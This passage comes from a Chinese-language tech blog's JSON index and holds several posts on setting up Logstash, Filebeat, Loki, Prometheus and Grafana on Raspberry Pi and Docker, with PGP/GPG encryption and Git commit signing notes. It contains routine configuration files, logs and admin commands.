CPU 吃到100%\n所以要等一下\n\n```\nUsing bundled JDK: /usr/share/logstash/jdk\nWARNING: Could not find logstash.yml which is typically located in $LS_HOME/config or /etc/logstash. You can specify the path using --path.settings. Continuing using the defaults\nCould not find log4j2 configuration at path /usr/share/logstash/config/log4j2.properties. Using default config which logs errors to the console\n[INFO ] 2021-05-01 16:04:55.718 [main] runner - Starting Logstash {\"logstash.version\"=>\"7.12.1\", \"jruby.version\"=>\"jruby 9.2.13.0 (2.5.7) 2020-08-03 9a89c94bcc OpenJDK 64-Bit Server VM 11.0.10+9 on 11.0.10+9 +indy +jit [linux-x86_64]\"}\n[INFO ] 2021-05-01 16:04:55.779 [main] writabledirectory - Creating directory {:setting=>\"path.queue\", :path=>\"/usr/share/logstash/data/queue\"}\n[INFO ] 2021-05-01 16:04:55.815 [main] writabledirectory - Creating directory {:setting=>\"path.dead_letter_queue\", :path=>\"/usr/share/logstash/data/dead_letter_queue\"}\n[WARN ] 2021-05-01 16:04:56.611 [LogStash::Runner] multilocal - Ignoring the 'pipelines.yml' file because modules or command line options are specified\n[INFO ] 2021-05-01 16:04:56.666 [LogStash::Runner] agent - No persistent UUID file found. Generating new UUID {:uuid=>\"f2a71911-edf5-4c53-bf68-5a31e6ad8dd7\", :path=>\"/usr/share/logstash/data/uuid\"}\n[INFO ] 2021-05-01 16:04:58.798 [Api Webserver] agent - Successfully started Logstash API endpoint {:port=>9600}\n[INFO ] 2021-05-01 16:05:00.048 [Converge PipelineAction::Create<main>] Reflections - Reflections took 101 ms to scan 1 urls, producing 23 keys and 47 values \n[INFO ] 2021-05-01 16:05:01.424 [[main]-pipeline-manager] javapipeline - Starting pipeline {:pipeline_id=>\"main\", \"pipeline.workers\"=>2, \"pipeline.batch.size\"=>125, \"pipeline.batch.delay\"=>50, \"pipeline.max_inflight\"=>250, \"pipeline.sources\"=>[\"config string\"], :thread=>\"#<Thread:0x701b0f11 run>\"}\n[INFO ] 2021-05-01 16:05:03.202 [[main]-pipeline-manager] javapipeline - Pipeline Java execution initialization time {\"seconds\"=>1.77}\nWARNING: An illegal reflective access operation has occurred\nWARNING: Illegal reflective access by com.jrubystdinchannel.StdinChannelLibrary$Reader (file:/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/jruby-stdin-channel-0.2.0-java/lib/jruby_stdin_channel/jruby_stdin_channel.jar) to field java.io.FilterInputStream.in\nWARNING: Please consider reporting this to the maintainers of com.jrubystdinchannel.StdinChannelLibrary$Reader\nWARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations\nWARNING: All illegal access operations will be denied in a future release\n[INFO ] 2021-05-01 16:05:03.290 [[main]-pipeline-manager] javapipeline - Pipeline started {\"pipeline.id\"=>\"main\"}\nThe stdin plugin is now waiting for input:\n[INFO ] 2021-05-01 16:05:03.469 [Agent thread] agent - Pipelines running {:count=>1, :running_pipelines=>[:main], :non_running_pipelines=>[]}\nhello\n{\n          \"host\" => \"ubuntu-focal\",\n       \"message\" => \"hello\",\n      \"@version\" => \"1\",\n    \"@timestamp\" => 2021-05-01T16:05:55.327Z\n}\n```\n\n\n\n### 設定\n\n1. logstash 預設會先抓/etc/logstash/conf.d 的config檔案\n2. logstash 預設會先抓/etc/logstash/logstash.yml\n\n[2.1 Config Of Logstash · ELK Stack 教學](https://mmx362003.gitbooks.io/elk-stack-guide/content/config_of_logstash.html)\n\n\n\n### config 設定\n\n\n#### stdin \n\n[标准输入(Stdin) | Logstash 最佳实践](https://doc.yonyoucloud.com/doc/logstash-best-practice-cn/input/stdin.html)\n\n```\ninput {\n    stdin {\n        add_field => {\"key\" => \"value\"}\n        codec => \"plain\"\n        tags => [\"add\"]\n        type => \"std\"\n    }\n}\n\n\noutput{\n    stdout{}\n}\n```\n\n```bash=\n# 在/usr/share/logstash 執行，stdin.conf 放在這邊執行\nsudo bin/logstash -f stdin.conf\n# {\n#           \"tags\" => [\n#         [0] \"add\"\n#     ],\n#           \"host\" => \"ubuntu-focal\",\n#           \"type\" => \"std\",\n#            \"key\" => \"value\",\n#       \"@version\" => \"1\",\n#        \"message\" => \":q\",\n#     \"@timestamp\" => 2021-05-01T16:38:27.958Z\n# }\n```\n\n\n#### file log\n\n```\ninput{\n    file {\n        path => [\"/var/log/*.log\", \"/var/log/message\"]\n        type => \"system\"\n        start_position => \"beginning\"\n    }\n}\n\n\noutput{\n    stdout{}\n}\n~                    \n```\n\n放在 /etc/logstash/conf/ 裡面\n執行 logstash 就能被觸發\n\n其他的就不記了\n可參考下面網址\n[输入插件(Input) | Logstash 最佳实践](https://doc.yonyoucloud.com/doc/logstash-best-practice-cn/input/index.html)\n\n[GitHub - chenryn/logstash-best-practice-cn: 本书已出版《ELK Stack权威指南》](https://github.com/chenryn/logstash-best-practice-cn)\n\n[GitHub - chenryn/ELKstack-guide-cn: ELK Stack 中文指南](https://github.com/chenryn/ELKstack-guide-cn)\n\n\n#### output\n\n```\noutput {\n    stdout {\n        codec => rubydebug\n        workers => 2\n    }\n}\n```\n\n#### output file \n\n```\noutput {\n    file {\n        path => \"/path/to/%{+yyyy/MM/dd/HH}/%{host}.log.gz\"\n        message_format => \"%{message}\"\n        gzip => true\n    }\n}\n\n````\n\n#### output Elasticsearch\n\n```\noutput {\n    elasticsearch {\n        host => \"192.168.0.2\"\n        protocol => \"http\"\n        index => \"logstash-%{type}-%{+YYYY.MM.dd}\"\n        index_type => \"%{type}\"\n        workers => 5\n        template_overwrite => true\n    }\n}\n```\n\n## filebeat\n\n### 安裝 filebeat\n\n```bash=\nwget https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-7.12.1-amd64.deb\nsudo apt install ./filebeat-7.12.1-amd64.deb\n```\n\n### 設定檔\n\n/etc/filebeat/filebeat.yml\n裡面有很多 input 都disable\noutput預設連到 localhost:9200 的 elasticsearch\n假如想用到 logstash 需要手動註解調，並打開logstash output 那邊\n\n![](https://i.imgur.com/2AufteG.png)\n\n![](https://i.imgur.com/YdOZW1G.png)\n\n請依照需求調整\n\n```bash=\n# 可以看到測試 log\nfilebeat -e\n# 沒問題的話，service 啟動\nsudo service filebeat start\n```\n\n### 相關模組\n\n```bash=\n# 查看可以用的模組\nfilebeat modules list\n```\n\n這邊先不深入研究\n[一篇文章搞懂filebeat（ELK） - 一寸HUI - 博客园](https://www.cnblogs.com/zsql/p/13137833.html)\n\n\n[GitHub - revolunet/traefik-filebeats-kibana: sample docker-compose with traefik and kibana dashboard using filebeats](https://github.com/revolunet/traefik-filebeats-kibana)\n\n\n### logstash 和 filebeat 關係\n\n網路上看到 filebeat 都傳送到 logstash 教學比較多\n但後來實作發現不是這樣\n可以依照需求直接傳到 elasticsearch\n甚至可以做到 LoadBalance 傳到 logstash\n詳細可以看:[搞懂ELK並不是一件特別難的事（ELK） - ⎝⎛CodingNote.cc ⎞⎠](https://codingnote.cc/zh-tw/p/144718/)\n\n甚是中間可以搭 Message Queue\n\n### kibana 設定filebeat\n\n去管理設定 Index Mangament\n點選 Create Index Partten\nstep 1 打 filebeat*\nstep 2 選 @timestamp \n新增完成，取選 Discover\n就可以用 KQL 查詢\n\n不方便截圖，所以這裡就簡單紀錄一下\n\n## 題外話\n\n原本目標， Nginx 抓出 Acess Log 做地圖分析\n不過想說安裝細結清楚一點比較好\n沒想到就花了不少時間整理\n\n目前查看我這個抓 Access Log GeoIP 方法\n\n1. 從 Nginx 下手取 geoip資訊(經緯度、縣市名稱)\n\n[Total Nginx monitoring, with application performance and a bit more, using Telegraf/InfluxDB/Grafana. | by Alexey Nizhegolenko | FAUN](https://faun.pub/total-nginx-monitoring-with-application-performance-and-a-bit-more-using-8fc6d731051b)\n\n2. Logstash Filter GeoIP 模組取得資訊\n\n[Grafana展示精美的nginx訪問日誌圖表_小小________ - MdEditor](https://www.mdeditor.tw/pl/g4XZ/zh-tw)\n\nLoki 目前沒有取出來 GeoIP 方法\n[Add support for Geo IP · Issue #2120 · grafana/loki · GitHub](https://github.com/grafana/loki/issues/2120)\n其實 Logstash 也能跟 Loki 串\n[Logstash | Grafana Labs](https://grafana.com/docs/loki/latest/clients/logstash/)\n但說真的 Logstash 效能感覺也不是很好(上面測試跑都要花一點時間，我還以為跑失敗)\n在樹梅派跑可能也很吃力\n\n本來想用 docker 執行看看，但官方沒有做 arm 版本\n就不測試了\n```bash=\ndocker run -it  --rm logstash:7.12.1 logstash -e 'input { stdin { } } output { stdout {} }' \n```\n\nGeoIP 哪貼心血來潮再進行測試\n這部分也沒有現成包好 docker 可以直接玩\n\n## 其他不錯文章\n\n[ElasticSearch 全文检索技术（一） - 简书](https://www.jianshu.com/p/f57176a3c03f)\n\n[logstash 和filebeat 是什么关系？ - 知乎](https://www.zhihu.com/question/54058964)\n\n[MongoDB和Elasticsearch的对比 | Leriou's Tavern](https://leriou.github.io/2019-01-09-mongodb-compareto-elasticsearch/)\n\n[搞懂ELK並不是一件特別難的事（ELK） - ⎝⎛CodingNote.cc ⎞⎠](https://codingnote.cc/zh-tw/p/144718/)\n\n[关于kibana的可视化可能都在这篇文章里了 - SegmentFault 思否](https://segmentfault.com/a/1190000022533196)\n\n[Kibana7.9.2设置elasticsearch索引过期时间，到期自动删除_螺蛳粉不加葱的博客-CSDN博客_es设置索引过期时间](https://blog.csdn.net/qq_41631365/article/details/109773675)\n\n[[Elasticsearch] 基本概念 & 搜尋入門 | 小信豬的原始部落](https://godleon.github.io/blog/Elasticsearch/Elasticsearch-getting-started/)","tags":["filebeat"],"categories":["ELK"]},{"title":"Loki 初體驗教學(在Raspberry 啟用 Docker-Loki-Driver)","url":"%2Fblog%2F2021%2F04%2F18%2FLoki-%E5%88%9D%E9%AB%94%E9%A9%97%E6%95%99%E5%AD%B8%2F","content":"\n最近在三台樹梅派使用 Docker 架設服務\n但是查看 log 真的不是很方便\n最近剛完 Prometheus 看到 Loki\n跟 Prometheus 很像，又是跟 Container 很有關係\n看了一下佈署流程，並不是非常難\n所以就食做看看\n\n<!--more-->\n\n使用官方 docker-compose [loki/docker-compose.yaml at master · grafana/loki · GitHub](https://github.com/grafana/loki/blob/master/production/docker-compose.yaml)\ngrafana 帳號密碼為 admin/admin\n進去新加 datasource 為 loki\n這樣就算部屬完成\n\nGrafana 要點選 `expore` 才能看到日誌\n\n```yaml=\nversion: \"3\"\n\nnetworks:\n  loki:\n\nservices:\n  loki:\n    image: grafana/loki:2.0.0\n    ports:\n      - \"3100:3100\"\n    command: -config.file=/etc/loki/local-config.yaml\n    networks:\n      - loki\n\n  promtail:\n    image: grafana/promtail:2.0.0\n    volumes:\n      - /var/log:/var/log\n    command: -config.file=/etc/promtail/config.yml\n    networks:\n      - loki\n\n  grafana:\n    image: grafana/grafana:latest\n    ports:\n      - \"3000:3000\"\n    networks:\n      - loki\n\n```\n\n本機是linux 的話， /var/log/底下都會傳到 loki 日誌去\n可以用 volume 把日誌掛到 containr 那邊去\n應該也有一樣的效果\n不過我下面還有比較好的方法\n\n\n加 loki datasource 和 explore操作\n[Loki轻量级日志系统_Kammingo的博客-CSDN博客](https://blog.csdn.net/Kammingo/article/details/115489954)\n\n[輕量級日誌系統Loki原理簡介和使用_平凡人筆記 - MdEditor](https://www.mdeditor.tw/pl/pKL4/zh-tw)\n\n\n* [使用 Loki 搭建个人日志平台 | 血衫非弧の一存](https://blog.kelu.org/tech/2020/01/31/grafana-loki-for-logging-aggregation.html)\n\n\n## docker 實作 Loki 日誌\n\n再 container 把日誌輸出來不是很方便\n所以我們是使用 docker 直接輸出日誌\n可算非常方便\n\n參考來源: \n[loki收集docker容器里运行服务的日志,loki+grafana_十个菜-CSDN博客](https://blog.csdn.net/u014756339/article/details/111992382)\n\n[docker swarm结合loki搭建轻量级日志监控系统 - 琴弦上的尼古丁](http://www.dlwxz.com/2020/07/docker-swarm%E7%BB%93%E5%90%88loki%E6%90%AD%E5%BB%BA%E8%BD%BB%E9%87%8F%E7%BA%A7%E6%97%A5%E5%BF%97%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F/)\n\n### 安裝 docker loki driver\n\n[Docker driver | Grafana Labs](https://grafana.com/docs/loki/latest/clients/docker-driver/)\n\n\n```bash=\ndocker plugin install grafana/loki-docker-driver:latest --alias loki --grant-all-permissions \n# 完成可用這個指令\ndocker plugin ls       \n```\n\n相關升級、移除可以在官網看到\n\n其他\n[Loki | 数据过期自动删除策略设计 - 华为云](https://www.huaweicloud.com/articles/f114e0a2a885a4ef8591dd11ff3590c7.html)\n\n比較有趣看到yaml 模板寫法\n\n```yaml=\nversion: \"3.4\"\n \nx-logging:\n  &loki-logging\n  driver: loki\n  options:\n    loki-url: \"http://YOUR_IP:3100/loki/api/v1/push\"\n    max-size: \"50m\"\n    max-file: \"10\"\n \nservices:\n  host:\n    container_name: grafana\n    image: grafana/grafana\n    environment:\n    - TZ=Asia/Shanghai\n    - LANG=zh_CN.UTF-8\n    logging: *loki-logging\n# ————————————————\n# 版权声明：本文为CSDN博主「2018_like菜」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。\n# 原文链接：https://blog.csdn.net/u014756339/article/details/111992382\n```\n\n\n## 樹梅派安裝法\n\n參考:[docker plugin enable Loki gives an error · Issue #974 · grafana/loki · GitHub](https://github.com/grafana/loki/issues/974#issuecomment-766390258)\n\n1. 嚐試安裝\n\n```\ndocker plugin install grafana/loki-docker-driver:latest --alias loki --grant-all-permissions \n```\n\n2. 看到錯誤\n\n```\nError response from daemon: dial unix /run/docker/plugins/61d4906b35d0d106db69561446160ba63bddb5f9a30d765293ddc75d11a6935b/loki.sock: connect: no such file or directory\n```\n\n3. git clone loki\n\n```\ngit clone --depth=1 https://github.com/grafana/loki.git\n\n```\n\n4. 在 loki 資料夾輸入\n\n```bash=\n\n# 安裝 golang\nsudo apt install golang\n# 編譯\nGOOS=linux GOARCH=arm GOARM=7 go build ./cmd/docker-driver\n```\n\n樹莓派 build 一直失敗，後來發想到 Golang 也是跨平台\n所以我在x86主機編譯順利。\n\n5. 編譯檔案(docker-driver)複製到/var/lib/docker/plugins/<ALPHA_NUMERIC_FOLDER>/rootfs/bin\n\n把編譯好的 docker-driver，\n\n```bash=\nsudo ls /var/lib/docker/plugins/\n# 有一個很長編碼資料夾就是\n\n```\n\n6. 啟動 docker plugin \n\n```bash=\ndocker plugin enable loki\n```\n\n這邊之前啟動的 docker containr 要刪掉重新起新的 container 才會有用\n\n\n### 全局設定\n\n編輯daemon.json。linux下默認路徑是/etc/docker/daemon.json (需要sudo)， windows則默認是%userprofile%\\.docker\\daemon.json\n\n\n```json=\n{\n  \"log-driver\": \"loki\",\n  \"log-opts\": {\n    \"loki-url\": \"http://YOUR_IP:3100/loki/api/v1/push\",\n    \"max-size\": \"50m\",\n    \"max-file\": \"10\"\n  },\n  \"registry-mirrors\": [\"https://registry.docker-cn.com\"]\n}\n```\n\n參考:[loki收集docker容器裡運行服務的日誌,loki+grafana_十個菜-CSDN博客](https://blog.csdn.net/u014756339/article/details/111992382)\n\n\n### 各自設定\n\n在 docker-compose 裡面加 logging\n\n```yaml=\nversion: \"3.7\"\nservices:\n  logger:\n    image: grafana/grafana\n    logging:\n      driver: loki\n      options:\n        loki-url: \"http://localhost:3100/loki/api/v1/push\"\n```\n\n就可以完成\n\n指令可以用\n\n```bash=\ndocker run --rm --name=grafana --log-driver=loki --log-opt loki-url=\"http://YOUR_IP:3100/loki/api/v1/push\" --log-opt max-size=50m --log-opt max-file=10 grafana/grafana\n\n# --log-driver=loki指定日志驱动器为loki\n# --log-opt loki-url则指定了loki的url\n# --log-opt max-size日志最大大小\n# --log-opt max-file日志文件最大数量\n```\n\n參考:* [loki收集docker容器里运行服务的日志,loki+grafana_十个菜-CSDN博客](https://blog.csdn.net/u014756339/article/details/111992382)\n\n\n## 使用 Loki 做 Traefik Acess Log 分析\n\nloki 架好後，相關 docker log 設定完\nGrafana 設定好 loki 資源\n這邊記得把 traefik access log 改成 json\n\n```yaml=\n#traefik\n    - \"--accesslog.format=json\"\n```\n\nimport 這個 dashboard [Traefik Via Loki dashboard for Grafana | Grafana Labs](https://grafana.com/grafana/dashboards/13713)\n\n還要把 json 內容裡面 label 改掉\n\n```\n{job=\\\"/var/log/traefik.log\\\"}\n```\n\n換成(這邊換成你電腦相對位置)\n\n```\n{container_name=\\\"rpi-traefik_traefik_1\\\",host=\\\"PI202\\\"}\n```\n\n[Traefik 2 监控系统之Grafana Prometheus Promtail Loki完美结合 - 简书](https://www.jianshu.com/p/68955d911fa4)\n詳細也可以看這篇，也寫得很完整\n\n\n也有看到非常強的 dashboard\n[Loki v2 Web Analytics Dashboard for NGINX dashboard for Grafana | Grafana Labs](https://grafana.com/grafana/dashboards/12559)","tags":["grafana"],"categories":["Loki"]},{"title":"抓出 Docker 裡面檔案設定檔出來","url":"%2Fblog%2F2021%2F04%2F15%2F%E6%8A%93%E5%87%BA-Docker-%E8%A3%A1%E9%9D%A2%E6%AA%94%E6%A1%88%E8%A8%AD%E5%AE%9A%E6%AA%94%E5%87%BA%E4%BE%86%2F","content":"\n之前這篇有提到 cp 指令[Docker 新手筆記 | 程式狂想筆記](https://malagege.github.io/blog/2017/08/20/logdown/2017-08-20-2201711/)\n但一直找有什麼方便複製 image 檔案\n今天看到相關網站方法\n整理出來\n\n<!--more-->\n\n```bash=\ndocker create --name prom_empty prom/prometheus\n# docker create ：創建一個新的容器但不啟動它\ndocker cp prom_empty:/etc/prometheus/prometheus.yml ./prometheus.yml\n```\n參考:[Monitor your Raspberry Pi cluster with Prometheus and Docker](https://blog.alexellis.io/prometheus-nodeexporter-rpi/)\n\n","tags":["docker"],"categories":["Docker"]},{"title":"使用 GitKrakn GIT 簽章(PGP)","url":"%2Fblog%2F2021%2F04%2F11%2F%E4%BD%BF%E7%94%A8-GitKrakn-GIT-%E7%B0%BD%E7%AB%A0-PGP%2F","content":"\n最近因緣際會下用到 PGP\n因為我們公司有用 gitlab \n之前就想研究 Git 簽章怎麼用\n但一直都沒有去嘗試\n最近碰到 PGP 加密\n竟然碰到相關問題，馬上使用看看\n\nGit mail 使用者名稱都可以自己改上傳\n使用簽章後，能證明GIT commit 是誰做的\n\n本篇是以方便使用 GUI 介面操作(Gitkrakn)\n並非以指令方式去做\n相關指令推薦爬相關專業文章\n\n\n<!--more-->\n\n## 相關 command 教學\n\n[Commit Signing with gpg - GitKraken Documentation](https://support.gitkraken.com/git-workflows-and-extensions/commit-signing-with-gpg/)\n\n\n[如何使用 GPG (GnuPG) 對 Git Commit 與 Tag 進行簽章 | The Will Will Web](https://blog.miniasp.com/post/2020/05/04/How-to-use-GPG-sign-git-commit-and-tag-object)\n\n\n[利用 GPG 簽署 git commit | Puck's Blog](https://blog.puckwang.com/post/2019/sign_git_commit_with_gpg/)\n\n## 簡單教學\n\n其實還滿簡單\n\n在 window 安裝 gpg4win\n\n設定 gitkrakn 那邊按 Generate (基本上指令可以打`GPG`就不需要設定)\n![](https://i.imgur.com/3HEBH0n.png)\n\nGitLab 設定把公鑰用到上面就可以驗證過了，但注意 git mail 名稱要跟 gitlab mail 一樣\n![](https://i.imgur.com/g8oCWE2.png)\n\nsign commits by default 記得要打勾\n雖然我還沒找到手動 commit 簽章選項\n有找到再回來寫\n\n[New added PGP key is unverified (#37572) · Issues · GitLab.org / GitLab FOSS · GitLab](https://gitlab.com/gitlab-org/gitlab-foss/-/issues/37572)\n\n這邊注意簽章信箱要跟gitlab 一樣才不會有問題\n","tags":["pgp"],"categories":["Git"]},{"title":"PGP 筆記","url":"%2Fblog%2F2021%2F04%2F11%2FPGP-%E7%AD%86%E8%A8%98%2F","content":"\n\n第一次使用 PGP加密筆記，原本看到 GPG 跟 Git 做簽章\n想說GPG 跟 PGP 應該沒甚麼關係\n但是後來爬文一下，GPG(GunPG)是產生和管理 PGP 金鑰軟體\n看來有空順便來研究 GIT 簽章\n\n## 測線上加密網站\n\nhttps://github.com/Gaff/pgp.help\n[pgp.help - Modern javascript client-side PGP encryption and decryption tool](https://pgp.help/#/)\n\n[SmartNinja Online PGP](https://smartninja-pgp.appspot.com/)\n\n[5 Online PGP Encryption Websites Free to Encrypt Email, Text](https://www.ilovefreesoftware.com/21/featured/online-pgp-encryption-websites-free-encrypt-email-text.html)\n\n[PGPTool - use this tool to encrypt and decrypt PGP files. OpenPGP compatible](https://pgptool.github.io/)\n\n## 測試 pgp 加解密\n\n簡單來講，就次把private key 和 public key 匯入到 gpg\n然後使用\n\n\n```bash=\ngpg --import {private/public key}\n\n# 加密：\n\n# recipient指定接收者的公鑰ID\ngpg --recipient {keyid/uid} --output encrypt.txt --encrypt input.txt\n# 也可以按喜好加上--armor選項等\n\n# 我更喜歡用 \ngpg  -se  -o  encrypt.txt  -r  {keyid/uid}   input.txt  \n# s代表簽名  e代表加密\n# o是 將結果 輸出到檔案  encrypt.txt\n# r後面跟 接收者的 uid或者 key id， 接收者的公鑰必須已經匯入過\n# input.txt 是你要加密的檔案\n\n\n# 解密：\ngpg  --output decrypt.txt  --decrypt encrypt.txt \n# 也可以\ngpg -d encrypt.txt   # 輸出到終端 直接檢視\n```\n[2021年，用更現代的方法使用PGP（上）_UCloud雲端計算 - MdEditor](https://www.mdeditor.tw/pl/gW1n/zh-tw)\n後來發現原始文章，放在下面\n\n[[GnuPG] gpg 金鑰管理 · Hello, World!](http://pre.tir.tw/008/blog/output/gnupg-gpg-jin-yao-guan-li.html)\n\n[GPG(GunPG)的使用 | Bolog](https://zhoubofsy.github.io/2017/05/18/security/gpg-usage/)\n\n[PGP，OpenPGP和GnuPG加密之間的區別 – 易璽科技 ECNETWORKER](https://www.ecnetworker.com/2019/08/26/pgp%EF%BC%8Copenpgp%E5%92%8Cgnupg%E5%8A%A0%E5%AF%86%E4%B9%8B%E9%96%93%E7%9A%84%E5%8D%80%E5%88%A5/)\n\n\n\n## 看起來實用工具\n\n[Java GPG解密关于:encrypted message contains a signed message - not literal data.的解决_程序地带](https://www.secn.net/article/107917.html)\n\n[Kleopatra - OpenPGP](https://www.openpgp.org/software/kleopatra/)\n\n[Gpg4win - 維基百科，自由的百科全書](https://zh.wikipedia.org/wiki/Gpg4win)\n\n    GnuPG: 核心加密工具\n    Kleopatra: 用於OpenPGP與X.509的憑證管理。\n    GPA: 另一個可選的憑證管理\n    GpgOL: Microsoft Outlook外掛程式，用於電子郵件加密\n    GpgEX: Windows Explorer外掛程式，用於檔案加密\n    Gpg4win Compendium: Gpg4win2的文件\n    \n[GnuPG - Software list](https://gnupg.org/related_software/swlist.html)\n    \n    \n## 更多 GPG 教學\n\n目前只有使用加解密跟 GIT 簽章\n不過好像還有更進階用法\n但是...目前好像用不太到\n先預留一下爬到不錯文章\n\n[2021年，用更现代的方法使用PGP（上） - C的博客 |UlyC](https://ulyc.github.io/2021/01/13/2021%E5%B9%B4-%E7%94%A8%E6%9B%B4%E7%8E%B0%E4%BB%A3%E7%9A%84%E6%96%B9%E6%B3%95%E4%BD%BF%E7%94%A8PGP-%E4%B8%8A/)\n[備份圖](https://imgur.com/wkvbboi.png)\n\n[2021年，用更现代的方法使用PGP（中） - C的博客 |UlyC](https://ulyc.github.io/2021/01/18/2021%E5%B9%B4-%E7%94%A8%E6%9B%B4%E7%8E%B0%E4%BB%A3%E7%9A%84%E6%96%B9%E6%B3%95%E4%BD%BF%E7%94%A8PGP-%E4%B8%AD/) [備份圖](https://imgur.com/LWYWSsm.png)\n\n[2021年，用更现代的方法使用PGP（下） - C的博客 |UlyC](https://ulyc.github.io/2021/01/26/2021%E5%B9%B4-%E7%94%A8%E6%9B%B4%E7%8E%B0%E4%BB%A3%E7%9A%84%E6%96%B9%E6%B3%95%E4%BD%BF%E7%94%A8PGP-%E4%B8%8B/) [備份圖](https://imgur.com/V07AWzh.png)\n\n\n\n    \n## InvalidKeyException: Illegal key size(測試解決成功)\n\n要安裝 JCE，原本不相信，但真的測試嚇一跳。還真的要安裝...\nPS: 我專案是Java1.7，1.8竟然可以跑\n\n![](https://i.imgur.com/XJscXex.png)\n\n[InvalidKeyException: Illegal key size异常解决方案 – 思码老徐](https://www.xuchengen.cn/451)\n\n\n[关于PGP解密基于Java Bouncy Castle_-0.0-的博客-CSDN博客](https://blog.csdn.net/weixin_44102477/article/details/88717815)\n\n\n[新增 Git GPG Key 增加安全性 - Askie's Coding Life](https://askie.today/git-pgp-keys/)\n\n## Java\n\n[PGP Encryption/Decryption in Java | Waiting for Wit](http://sloanseaman.com/wordpress/2011/08/11/pgp-encryptiondecryption-in-java/)","tags":["gpg"],"categories":["Java"]},{"title":"Raspberry Pi 部屬 Prometheus","url":"%2Fblog%2F2021%2F04%2F05%2FRaspberry-Pi-%E9%83%A8%E5%B1%AC-Prometheus%2F","content":"\n參考:[docker-prometheus/docker-compose.yml at master · Kev1nChan/docker-prometheus · GitHub](https://github.com/Kev1nChan/docker-prometheus/blob/master/docker-compose.yml)\n\n**使用 Raspberry Pi 3/4 注意使用 32 位元都會有機會遇到記憶體問題**\n建議使用 64 bit\n`uname -m`\n不是 arrch64 都是 32bit\n\n<!--more-->\n\n## 架設 Prometheus\n\n調整部份 Raspberry PI\n\n```yaml\nversion: '3.3'\n\nvolumes:\n  prometheus_data: {}\n  grafana_data: {}\n\nnetworks:\n  monitoring:\n    driver: bridge\n\nservices:\n  prometheus:\n    image: prom/prometheus:v2.26.0\n    container_name: prometheus\n    restart: always\n    volumes:\n      - /etc/localtime:/etc/localtime:ro\n      - $PWD/prometheus/:/etc/prometheus/\n      - prometheus_data:/prometheus\n    command:\n      - '--config.file=/etc/prometheus/prometheus.yml'\n      - '--storage.tsdb.path=/prometheus'\n      - '--web.console.libraries=/usr/share/prometheus/console_libraries'\n      - '--web.console.templates=/usr/share/prometheus/consoles'\n    networks:\n      - monitoring\n    links:\n      - alertmanager\n      - cadvisor\n    expose:\n      - '9090'\n    ports:\n      - 9090:9090\n    depends_on:\n      - cadvisor\n\n  alertmanager:\n    image: prom/alertmanager:v0.21.0\n    container_name: alertmanager\n    restart: always\n    volumes:\n      - /etc/localtime:/etc/localtime:ro\n      - $PWD/alertmanager/:/etc/alertmanager/\n    command:\n      - '--config.file=/etc/alertmanager/config.yml'\n      - '--storage.path=/alertmanager'\n    networks:\n      - monitoring\n    expose:\n      - '9093'\n    ports:\n      - 9093:9093\n\n  cadvisor:\n    image:  budry/cadvisor-arm:latest #gcr.io/cadvisor/cadvisor:v0.39.0\n    container_name: cadvisor\n    restart: always\n    volumes:\n      - /etc/localtime:/etc/localtime:ro\n      - /:/rootfs:ro\n      - /var/run:/var/run:rw\n      - /sys:/sys:ro\n      - /var/lib/docker/:/var/lib/docker:ro\n    networks:\n      - monitoring\n    expose:\n      - '8080'\n\n  node_exporter:\n    image:  quay.io/prometheus/node-exporter:latest #prom/node-exporter:v0.18.0\n    container_name: node-exporter\n    restart: always\n    volumes:\n      - /etc/localtime:/etc/localtime:ro\n      - /proc:/host/proc:ro\n      - /sys:/host/sys:ro\n      - /:/rootfs:ro\n    command:\n      - '--path.procfs=/host/proc'\n      - '--path.sysfs=/host/sys'\n      - --collector.filesystem.ignored-mount-points\n      - \"^/(sys|proc|dev|host|etc|rootfs/var/lib/docker/containers|rootfs/var/lib/docker/overlay2|rootfs/run/docker/netns|rootfs/var/lib/docker/aufs)($$|/)\"\n    networks:\n      - monitoring\n    expose:\n      - '9100'\n\n  grafana:\n    image: grafana/grafana:7.5.2\n    user: \"104\"\n    container_name: grafana\n    restart: always\n    volumes:\n      - /etc/localtime:/etc/localtime:ro\n      - grafana_data:/var/lib/grafana\n      - $PWD/grafana/provisioning/:/etc/grafana/provisioning/\n    env_file:\n      - $PWD/grafana/config.monitoring\n    networks:\n      - monitoring\n    links:\n      - prometheus\n    ports:\n      - 3000:3000\n    depends_on:\n      - prometheus\n\n```\n\n\n接下來設定在 Grafana 設定 Promethus Datasource 設定\n就完成了\n\n相關 alertmanager 調整請看 15分鐘建製 Promethus 環境\n\n## Node Exporter\n\n我原本以為 Node Exporter 要抓本機機器一定要用 Systemd 去執行程式\n但看範例是用 Docker\n感覺不一定要用 Systemd\n\n這邊我機器都有安裝 Docker\n所以我就沒選則用這個方式\n\n使用 Systemd 方式記錄一下\n可參考\n1. [node_exporter 配置 - 简书](https://www.jianshu.com/p/7bec152d1a1f)\n2. [Installing node_exporter as systemd serivice · GitHub](https://gist.github.com/jarek-przygodzki/735e15337a3502fea40beba27e193b04)\n\n```\nsudo tee /etc/systemd/system/node_exporter.service <<\"EOF\"\n[Unit]\nDescription=Node Exporter\n\n[Service]\nUser=node_exporter\nGroup=node_exporter\nEnvironmentFile=-/etc/sysconfig/node_exporter\nExecStart=/usr/local/bin/node_exporter $OPTIONS\n\n[Install]\nWantedBy=multi-user.target\nEOF\n```\n\n\ndocker 要怎麼用呢?\n其實上面就寫了\n\n官方寫法跟我的有點不太一樣\n\n```bash\ndocker run -d \\\n  --net=\"host\" \\\n  --pid=\"host\" \\\n  -v \"/:/host:ro,rslave\" \\\n  quay.io/prometheus/node-exporter:latest \\\n  --path.rootfs=/host\n```\n\n```yaml=\n---\nversion: '3.8'\n\nservices:\n  node_exporter:\n    image: quay.io/prometheus/node-exporter:latest\n    container_name: node_exporter\n    command:\n      - '--path.rootfs=/host'\n    network_mode: host\n    pid: host\n    restart: unless-stopped\n    volumes:\n      - '/:/host:ro,rslave'\n```\n\n這邊不太明白 network_mode 要用 host 模式?\n\n最我我選擇調整別台使用 docker\n\n```yaml=\n\n---\nversion: '3.8'\n\nservices:\n  node_exporter:\n    image:  quay.io/prometheus/node-exporter:latest \n    container_name: node-exporter\n    restart: always\n    volumes:\n      - /etc/localtime:/etc/localtime:ro\n      - /proc:/host/proc:ro\n      - /sys:/host/sys:ro\n      - 